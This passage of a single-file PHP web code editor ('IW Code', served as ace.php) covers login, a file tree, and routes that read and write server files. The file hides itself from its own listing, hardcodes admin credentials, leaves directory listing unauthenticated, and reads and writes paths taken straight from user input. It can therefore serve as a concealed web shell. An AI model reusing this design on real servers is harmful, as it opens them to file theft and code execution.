U0TDQuMzI2OTggMjAuMzYyWk04LjIgMkM3LjY1NjQ1IDIgNy4xODg2NCAxLjk5OTIyIDYuODA0OTcgMi4wMzA1N0M2LjQwOTYzIDIuMDYyODcgNi4wMTY0MSAyLjEzNDE5IDUuNjM4MDMgMi4zMjY5OEw2LjU0NjAxIDQuMTA4OTlDNi41OTU0NSA0LjA4MzggNi42OTYxNyA0LjA0NjEyIDYuOTY3ODQgNC4wMjM5M0M3LjI1MTE3IDQuMDAwNzggNy42MjM0NSA0IDguMiA0VjJaTTYgNi4yQzYgNS42MjM0NSA2LjAwMDc4IDUuMjUxMTcgNi4wMjM5MyA0Ljk2Nzg0QzYuMDQ2MTIgNC42OTYxNyA2LjA4MzggNC41OTU0NSA2LjEwODk5IDQuNTQ2MDFMNC4zMjY5OCAzLjYzODAzQzQuMTM0MTkgNC4wMTY0MSA0LjA2Mjg3IDQuNDA5NjMgNC4wMzA1NyA0LjgwNDk3QzMuOTk5MjIgNS4xODg2NCA0IDUuNjU2NDUgNCA2LjJINlpNNS42MzgwMyAyLjMyNjk4QzUuMDczNTQgMi42MTQ2IDQuNjE0NiAzLjA3MzU0IDQuMzI2OTggMy42MzgwM0w2LjEwODk5IDQuNTQ2MDFDNi4yMDQ4NyA0LjM1Nzg1IDYuMzU3ODUgNC4yMDQ4NyA2LjU0NjAxIDQuMTA4OTlMNS42MzgwMyAyLjMyNjk4WiIgZmlsbD0iI2ZmZmZmZiIvPiA8L2c+Cgo8L3N2Zz4=`;
    let fileSet = '';
    let extType = ['php', 'js', 'json', 'py', 'txt', 'md', 'html', 'css', 'yml', 'env','htaccess'];
    let extMedia = ['jpg', 'jpeg', 'png', 'webp', 'gif', 'mp4', 'mp3', 'zip', 'rar', 'iso','ico','doc', 'docx', 'xls', 'xlsx', 'pdf', 'sql', 'gz'];
    let beautify = ace.require("ace/ext/beautify");
    let editor = ace.edit("editor");
    editor.setTheme("ace/theme/ambiance");
    editor.session.setMode("ace/mode/javascript");
    editor.setOption("enableEmmet", true);
    
    editor.setOptions({
        enableBasicAutocompletion: true,
        enableLiveAutocompletion: true
    });
    
    let langTools = ace.require("ace/ext/language_tools");
    let wordList = ["foo", "bar", "baz"]; // Your autocompletion word list
    let completer = {
        getCompletions: function(editor, session, pos, prefix, callback) {
            callback(null, wordList.map(function(word) {
                return {
                    caption: word,
                    value: word,
                    meta: "custom"
                };
            }));
        }
    };
    langTools.addCompleter(completer);
    
    
    editor.setOptions({
      fontSize: "11pt"
    });
    
    function _id(a){
        return document.getElementById(a) ? document.getElementById(a) : null;
    }
    
    function apiFetch(url = '', data = [], callback=null){
        
        const formData = new FormData();
        
        data.forEach(function(s){
            if(s.name && s.value){
                formData.append(s.name, s.value);
            }
        });
        
        fetch(url, {
            method: 'post',
            body: formData,
        })
        .then(function(r){
            return r.json();
        })
        .then(function(r){
            if(callback){
                callback(r);
            }else{
                console.log(r);
            }
        })
        .catch(function(e){
            alert(e);
        })
    }
    
    function openModal(){
        return _id('modal-open') ? _id('modal-open').click() : null;
    }
    
    function closeModal(){
        return _id('modal-close') ? _id('modal-close').click() : null;
    }
    
    function div(){
        return document.createElement('div');
    }
    
    function addToModalBody(title="", html = ""){
        let dv = document.createElement('div');
        if(_id('modal-title')){
            _id('modal-title').innerHTML = title;
        }
        if(_id('modal-body')){
            let bodyModal = _id('modal-body');
            bodyModal.innerHTML = '';
            dv.innerHTML = html;
            bodyModal.appendChild(dv);
            return true;
        }
        return false;
    }
    
    
    let Link = {
        "open-project": "/ace.php/dir?path=",
        "open-file": "/ace.php/file?path=",
        "create-file": "/ace.php/create?path=",
        "save-file": "/ace.php/save"
    }
    
    function actionCall(element, callback){
        let q = Array.from(document.querySelectorAll('['+element+']'));
        q.forEach(function(j){
            j.onclick = function(){
                let data = this.dataset;
                callback(data);
            }
        });
    }
    
    function savePath(){
        if(_id('modal-footer')){
            _id('modal-footer').innerHTML = '';
            let d = div();
            d.innerHTML = `
                <button class="p-2 bg-indigo-950 rounded-md text-white" id="open-project-path">Open Project<button>
            `;
            _id('modal-footer').appendChild(d);
            _id('open-project-path').onclick = function(){
                localStorage.setItem('path', FolderActive);
                closeModal();
                Api.loadFolder();
            }
        }
    }
    
    let FolderActive = "";
    let containerFolder=null;
    
    function textToFile(text, filename) {
      // Create a Blob object from the text
      const blob = new Blob([text], { type: 'text/plain' });
    
      // Wrap the Blob in a File object
      const file = new File([blob], filename);
    
      return file;
    }
    
    document.addEventListener('keydown', function(event) {
      // Check if Ctrl + S was pressed
      if (event.ctrlKey && event.key === 's') {
        event.preventDefault(); // Prevent browser's default save behavior
        // Your save function here
        if(fileSet && fileSet != ""){
            
            let ext = fileSet.split('.').pop();
            if(extType.indexOf(ext) != -1){
            
                apiFetch(Link["save-file"], [
                    {
                        name: 'file',
                        value: textToFile(editor.getValue(),fileSet)
                    }
                    ,{
                        name: 'path',
                        value: fileSet
                    }
                ], function(r){
                    Toastify({
    
                        text: "File save",
                        
                        duration: 1000
                    
                    }).showToast();
                })
            }else{
                if(extMedia.indexOf(ext) == -1){
                    apiFetch(Link["save-file"], [
                        {
                            name: 'file',
                            value: textToFile(editor.getValue(),fileSet)
                        }
                        ,{
                            name: 'path',
                            value: fileSet
                        }
                    ], function(r){
                        Toastify({
        
                            text: "File save",
                            
                            duration: 1000
                        
                        }).showToast();
                    })
                }else{
                    Toastify({
    
                        text: "File Media",
                        
                        duration: 1000
                    
                    }).showToast();
                }
            }
            
            
        }
        // You might want to call a save function or execute your save logic here
      }
    });
    
    let Api = {
        
        loadFolder : function(pathid=null, Node){
            let savepath = localStorage.getItem('path');
            let pathFile= savepath?savepath:"";
            if(pathid){
                pathFile = pathid;
            }
            let lnk = Link["open-project"];
            apiFetch(lnk+pathFile, [], function(r){
                if(!pathid){
                    _id('folder-show').innerHTML = '';
                }
                
                let d = el('ul');
                
                d.css({
                    whiteSpace:'nowrap',
                    overflow:'hidden'
                })
                
                if(!pathid){
                    containerFolder = d;
                }
                
                r.map(function(o){
                    console.log(pathid);
                    console.log(o.name);
                    let li = el('li');
                    li.class(`px-2 text-white rounded-sm py-[1px] border-1`);
                    li.data('type', o.type);
                    li.css({
                        whiteSpace:'nowrap',
                        fontSize: '10pt'
                    });
                    if(o.name == 'ace.php' && !pathid){
                       li.css('display', 'none');
                    }
                    li.data('path',`${(pathFile != ''? (
                            pathFile.split('/').pop() != ""? pathFile+"/" : pathFile
                        ): pathFile)+o.name}/`);
                    li.html(`
                        <img width="14pt" src="${o.type=='folder'?iconFolder:iconFile}" style="display:inline-block;margin-right:5px;" />${o.name}
                    `);
                    li.child(
                        el('div')
                        .child(
                            el('div')
                            
                        )
                    )
                    li.cursor('pointer')
                    li.load(function(e){
                        e.el.addEventListener('contextmenu', function(event) {
                            // Mencegah tindakan default dari menu konteks muncul
                            event.preventDefault();
                            
                            let type = event.target.dataset.type;
                            let path = event.target.dataset.path;
                            const cc = document.querySelector(`ul[data-path="${path}"]`);
                            let pathR = path.split('/');
                            let rr = pathR.pop();
                            if(rr != ""){
                                pathR.push(rr);
                            }
                            path = pathR.join("/");
                            
                            if(type == 'folder'){
                                openModal();
                                
                                addToModalBody('PATH : '+path, `
                                    <label>Path Aktif</label>
                                    <input id="s-path" placeholder="buat file atau folder baru" class="p-2 text-white bg-gray-600 w-full" style="border: 1px solid #aaa;" readonly value="${path}"/>
                                    <label class="block mt-2">File/ Folder Baru</label>
                                    <input id="n-path" placeholder="buat file atau folder baru" class="p-2 bg-gray-200 w-full" style="border: 1px solid #aaa;" />
                                    <div>
                                        <button id="buat-folder-baru" class="p-2 bg-indigo-800 mt-2 text-white rounded-md">Simpan</button>
                                    </div>
                                `);
                                _id('modal-footer').innerHTML = '';
                                
                                _id('buat-folder-baru').onclick = function(){
                                    let nfile = _id('s-path').value+'/'+_id('n-path').value;
                                    
                                    apiFetch(Link["create-file"], [
                                        {
                                            name: 'file',
                                            value: nfile
                                        }
                                    ], function(r){
                                        Toastify({
                                            text: "File Created",
                                            duration: 1000
                                        }).showToast();
                                        cc.innerHTML = '';
                                        Api.loadFolder(path+'/', cc);
                                        closeModal();
                                    });
                                    
                                }
                                
                            }
                            
                        });
                    })
                    li.click(function(){
                        let data = this.dataset;
                        
                        if(data.type && data.type == 'folder'){
                            const cc = document.querySelector(`ul[data-path="${data.path}"]`);
                            cc.dataset.show == 'false'?
                                el(cc)
                                .css({
                                    height: 'auto',
                                    overflow: 'auto'
                                })
                                .data('show', true)
                            :
                                el(cc)
                                .css({
                                    height: '0px',
                                    overflow: 'hidden'
                                })
                                .data('show', false)
                            ;
                            cc.innerHTML = '';
                            Api.loadFolder(data.path, cc);
                        }else{
                            let file = data.path.split('/');
                            let last = file.pop();
                            if(last != ''){
                                file.push(last);
                            }
                            let filePath = file.join('/');
                            let lnkfile = Link["open-file"];
                            editor.setValue("", -1)
                            fileSet = filePath;
                            let ext = filePath.split('.').pop();
                            if(extType.indexOf(ext) != -1){
                                apiFetch(lnkfile+filePath, [], function(r){
                                    let contentType = filePath.split('.').pop();
                                    if(contentType == 'php'){
                                        editor.getSession().setMode("ace/mode/php");
                                    }
                                    if(contentType == 'js'){
                                        editor.getSession().setMode("ace/mode/javascript");
                                    }
                                    if(contentType == 'css'){
                                        editor.getSession().setMode("ace/mode/css");
                                    }
                                    editor.setValue(r.code, -1)
                                })
                            }else{
                                if(extMedia.indexOf(ext) == -1){
                                    apiFetch(lnkfile+filePath, [], function(r){
                                        let contentType = filePath.split('.').pop();
                                        if(contentType == 'php'){
                                            editor.getSession().setMode("ace/mode/php");
                                        }
                                        if(contentType == 'js'){
                                            editor.getSession().setMode("ace/mode/javascript");
                                        }
                                        if(contentType == 'css'){
                                            editor.getSession().setMode("ace/mode/css");
                                        }
                                        editor.setValue(r.code, -1)
                                    })
                                }else{
                                     Toastify({
                    
                                        text: "File Media",
                                        
                                        duration: 1000
                                    
                                    }).showToast();
                                }
                            }
                        }
                    })
                    d.child(li);
                    d.child(
                        el('ul')
                        .class('pl-2 ml-1')
                        .data('show', false)
                        .css({
                            borderLeft: '1px dotted #ddd'
                        })
                        .data('path', `${(pathFile != ''? (
                            pathFile.split('/').pop() != ""? pathFile+"/" : pathFile
                        ): pathFile)+o.name}/`)
                    );
                });
                
                
                
                if(!pathid){
                
                
                    _id('folder-show').appendChild(d.get());
                    
                }else{
                    const cc = Node;
                    if(cc){
                       cc.appendChild(d.get());
                    }
                }
                
            });
        },
    
        file : function(link, data, modal = true){
            let pathFile = data.path ? data.path:'';
            let pathslice = pathFile.split('/');
            let popdata = pathslice.pop();
            if(popdata != '..'){
                pathslice.push(popdata)
            }else{
                pathslice.pop();
            }
            pathFile = pathslice.join('/');
            FolderActive = pathFile;
            let lnk = Link[link];
            apiFetch(lnk+pathFile, [], function(r){
                if(modal){
                    openModal();
                }
                addToModalBody("Open Project",`
                    <div class="p-[5px;]" style="max-height: 300px; overflow:auto; background:#000;">
                        <ul>
                            ${FolderActive != ""?`
                                <li data-action-list data-path="${pathFile}${pathFile.split('/').pop() == ''? '..': '/..'}" class="px-2 rounded-sm py-[3px] mb-1 border-1 text-white" style="cursor:pointer;background:#333;">..</li>
                            `:``}
                            ${r.filter(function(s){return s.type=='folder'?s:null}).map(function(o){
                                return `
                                    <li data-action-list data-path="${(pathFile != ''? (
                                        pathFile.split('/').pop() != ""? pathFile+"/" : pathFile
                                    ): pathFile)+o.name}/" class="px-2 text-white rounded-sm py-[3px] mb-1 border-1" style="cursor:pointer;background:#777;">
                                        <img src="${o.type=='folder'?iconFolder:iconFile}" style="display:inline-block;margin-right:5px;color:white;" />
                                        ${o.name}
                                    </li>
                                `;
                            }).join('')}
                        </ul>
                    </div>
                `);
                actionCall('data-action-list', function(data){
                    Api.file('open-project', data, false)
                });
            });
            savePath();
        }
    }
    
    Array.from(
        document.querySelectorAll("button[data-action]")
    ).forEach(function(btn){
        btn.onclick = function(){
            let btnact = this.dataset.action;
            let savepath = localStorage.getItem('path');
            let datasend = this.dataset;
            if(savepath){
                datasend.path = savepath;
            }else{
                datasend.path = "";
            }
            Api.file(btnact, datasend);
        }
    });
    
    Api.loadFolder();
    
EOT;
} catch (\Throwable $e) {}


ErrorHandler::cek(function(){

$GLOBALS['login'] = <<<EOT
<div class="bg-indigo-950 h-full flex" style="justify-content:center;align-items: center;">
    <form action="/ace.php/loginprocess" class="p-3 bg-white rounded w-[320px]" method="post">
        <div>
            <h1 class="text-center">Login <> IW Code</h1>
        </div>
        <div class="mb-2">
            <label>Username</label>
            <input name="username" class="block w-full p-2" style="border: 1px solid #333;" type="username" placeholder="username"/>
        </div>
        <div class="mb-2">
            <label>Username</label>
            <input name="password" class="block w-full p-2" style="border: 1px solid #333;" type="password" placeholder="username"/>
        </div>
        <div>
            <button type="submit" class="text-center p-2 bg-indigo-800 text-white w-full">Login</button>
        </div>
    </form>
</div>
EOT;
    
});

ErrorHandler::cek(function(){
    
    Environtment::setEnv('ULRAREA', '/ace.php');
    
    Environtment::setEnv('SESSION', 'd8f6509e6b419218e03dfaccb244ef18');
    Environtment::setEnv('USERNAME', 'admin');
    Environtment::setEnv('PASSWORD', 'd8f6509e6b419218e03dfaccb244ef18');
    
    $route = new Route('./', ULRAREA);
    
    $route->addMidleware('login', function(){
        if(Session::get('login') == ""){
            $urlArea = ULRAREA;
            echo "<script>";
            echo "window.location.href = '$urlArea/login'";
            echo "</script>";
            die();
        }
    });
    
    $route->add('/api/file', function(){
    });
    
    $route->add('/', function(){
        $html = new HtmlContainer();
        $html->head([
            "title" => "Code Editor",
            "css" => [
                "https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.css"
                ,"https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css"
            ],
            "script" => [
                "https://cdn.tailwindcss.com"
                , "https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ext-beautify.min.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ext-emmet.min.js"
                , "https://cdn.jsdelivr.net/npm/toastify-js"
                , "https://code.jquery.com/jquery-3.6.0.min.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ext-emmet.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ext-language_tools.js"
            ]
        ]);
        
        
        $GLOBALS[contentBody] .="<script src=\"/ace.php/content/script.js?v=".date('Ymdhis')."\"></script>";
        $html->body(
            $GLOBALS[contentBody]
        );
        $html->get();
    })
    ->middleware('login')
    ;
    
    $route->add('/login', function(){
        $html = new HtmlContainer();
        $html->head([
            "title" => "Login - Code Editor",
            "css" => [
                "https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.css"
                ,"https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css"
            ],
            "script" => [
                "https://cdn.tailwindcss.com"
                , "https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ext-beautify.min.js"
                , "https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ext-emmet.min.js"
                , "https://cdn.jsdelivr.net/npm/toastify-js"
                , "https://code.jquery.com/jquery-3.6.0.min.js"
            ]
        ]);
        $html->body($GLOBALS['login']);
        $html->get();
    })
    ;
    
    $route->add('/content/script.js', function(){
        header('Content-Type: application/javascript');
        echo $GLOBALS['modulescript']."\n".$GLOBALS["contentScript"];
    });
    
    $route->add('/dir', function(){
        HeaderContent::set('json');
        $file = Files::dir('./');
        if($_GET['path']){
            $file = Files::dir('./'.$_GET['path']);
        }
        echo json_encode($file);
    });
    
    $route->add('/loginprocess', function(){
        $urlArea = ULRAREA;
        if( md5(sha1($_POST['password'])) == PASSWORD && $_POST['username'] == USERNAME ){
            Session::put('login', [
                "status" => "success"
            ]);
            echo "<script>";
            echo "window.location.href = '$urlArea/'";
            echo "</script>";
        }else{
            echo "<script>";
            echo "window.location.href = '$urlArea/login'";
            echo "</script>";
        }
    });
    
    $route->add('/logout', function(){
        $urlArea = ULRAREA;
        Session::delete('login');
        echo "<script>";
        echo "window.location.href = '$urlArea/login'";
        echo "</script>";
    });
    
    function createPath($path = "") {
        // Jika path adalah sebuah file, buat folder dan file secara rekursif
        if (pathinfo($path, PATHINFO_EXTENSION)) {
            $dir = dirname($path);
            if (!is_dir($dir)) {
                mkdir($dir, 0777, true);
            }
            file_put_contents($path, ''); // Anda bisa menambahkan isi file di sini jika perlu
        } else { // Jika path adalah sebuah folder, buat folder secara rekursif
            if (!is_dir($path)) {
                mkdir($path, 0777, true);
            }
        }
    }
    
    $route->add('/create', function(){
        HeaderContent::set('json');
        createPath($_POST['file']);
        echo json_encode([
            "file" => $_POST['file']
        ]);
    })
    ->middleware('login');
    
    $route->add('/file', function(){
        HeaderContent::set('json');
        $file = Files::dir('./');
        if($_GET['path']){
            $file = Files::read('./'.$_GET['path']);
        }
        echo json_encode([
            "code" => $file
        ]);
    })
    ->middleware('login');
    
    $route->add('/save', function(){
        $file = $_FILES['file']['tmp_name'];
        $path = $_POST['path'];
        if (move_uploaded_file($file, $path)) {
            echo json_encode([
                "status" => "success"
            ]);
        } else {
            echo json_encode([
                "status" => "failed"
            ]);
        }
    })
    ->middleware('login');
    
    $route->call();
});
